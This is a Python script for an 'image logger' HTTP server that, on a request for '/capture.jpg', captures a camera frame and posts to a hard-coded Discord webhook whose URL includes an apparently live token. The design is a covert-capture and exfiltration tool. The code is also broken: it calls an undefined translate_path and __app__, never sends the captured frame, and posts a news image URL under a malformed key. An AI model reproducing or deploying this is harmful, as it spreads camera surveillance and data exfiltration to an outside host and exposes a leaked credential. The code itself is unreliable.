import os
import sys
import base64
import http.server
import socketserver
import urllib.parse
import httpagentparser
import cv2
import requests
from datetime import datetime

class ImageLoggerAPI(http.server.BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            if self.path == '/':
                self.path = '/index.html'

            path = self.translate_path(self.path)

            if not os.path.exists(path) or not os.path.isfile(path):
                return

            with open(path, 'rb') as f:
                self.wfile.write(f.read())

            if self.path.endswith('/capture.jpg'):
                # Camera settings
                camera_index = 0  # default camera index
                camera_width = 640
                camera_height = 480

                # Open the camera
                cap = cv2.VideoCapture(camera_index)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, camera_width)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, camera_height)

                # Capture an image
                ret, frame = cap.read()
                if not ret:
                    print("Failed to capture image")
                    exit()

                # Convert the image to JPEG format
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
                result, encimg = cv2.imencode('.jpg', frame, encode_param)

                # Send the image to the Discord server using the webhook
                webhook_url = "https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD"  # Replace with your Discord webhook URL
                image_url = "https://ortacizgi.com/images/news/cristiano-ronaldo-ve-besiktas-ayni-projede.jpg"  # Add your image URL here
                data = {'username': 'Spidey Bot', 'https://discord.com/assets/ac6f8cf36394c66e7651.png': image_url}
                response = requests.post(webhook_url, data=data)

                # Check if the request was successful
                if response.status_code == 204:
                    print("Image sent successfully!")
                else:
                    print("Failed to send image:", response.text)

                # Wait for a key press and close the window
                cv2.waitKey(0)
                cv2.destroyAllWindows()

        except Exception as e:
            print("Error occurred: ", e)
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(bytes("Error occurred: " + str(e), "utf-8"))

    do_GET = handleRequest
    do_POST = handleRequest

def run(server_class=http.server.HTTPServer,
        handler_class=ImageLoggerAPI,
        port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting {__app__} on port {port}...")
    httpd.serve_forever()

run()